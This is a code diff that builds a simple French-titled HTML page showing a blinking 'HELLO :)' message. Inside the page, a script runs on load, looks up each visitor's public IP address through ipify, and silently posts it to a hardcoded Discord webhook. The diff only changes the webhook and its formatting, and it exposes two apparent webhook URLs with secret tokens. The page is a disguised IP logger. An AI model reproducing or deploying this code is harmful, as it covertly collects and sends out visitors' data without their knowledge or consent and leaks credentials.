@@ -1,23 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>HELLO avec animation en CSS</title>
+<style>
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    background-color: #1e90ff;
+}
+
+h1 {
+    font-size: 10rem;
+    color: #fff;
+    text-shadow: 4px 4px #000;
+    animation: blink 2s ease-in-out infinite;
+}
+
+@keyframes blink {
+    50% {
+    opacity: 0;
+    }
+}
+</style>
 <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1087050438865588444/RQudHKY5dJKizPnLPTgQ1mGlIC5JmkWiey8EudXYXIwo_vPDz0TpdE17qDvH1Lqwiznv";
+    const webhookUrl = "https://discord.com/api/webhooks/1087057397475983500/qksfO4IySRzM2sfWfmh5k4hWqjbYMl79E0imJ4L0BhhUzIa-QoEjQ9R8T_q_WwzfynWd";
     const ipifyUrl = "https://api.ipify.org?format=json";
 
     fetch(ipifyUrl)
-    .then(response => response.json())
-    .then(data => {
+      .then(response => response.json())
+      .then(data => {
         const message = {
-        content: `Nouvelle visite de ${data.ip}`,
+          content: `Random IP | Nouvelle visite de ||${data.ip}||`,
         };
 
         fetch(webhookUrl, {
-        method: "POST",
-        headers: {
+          method: "POST",
+          headers: {
             "Content-Type": "application/json",
-        },
-        body: JSON.stringify(message),
+          },
+          body: JSON.stringify(message),
         })
-        .then(response => console.log(response))
-        .catch(error => console.error(error));
-    })
-    .catch(error => console.error(error));
-</script>
+          .then(response => console.log(response))
+          .catch(error => console.error(error));
+      })
+      .catch(error => console.error(error));
+  </script>
+</head>
+<body>
+<h1>HELLO :)</h1>
+</body>
+</html>
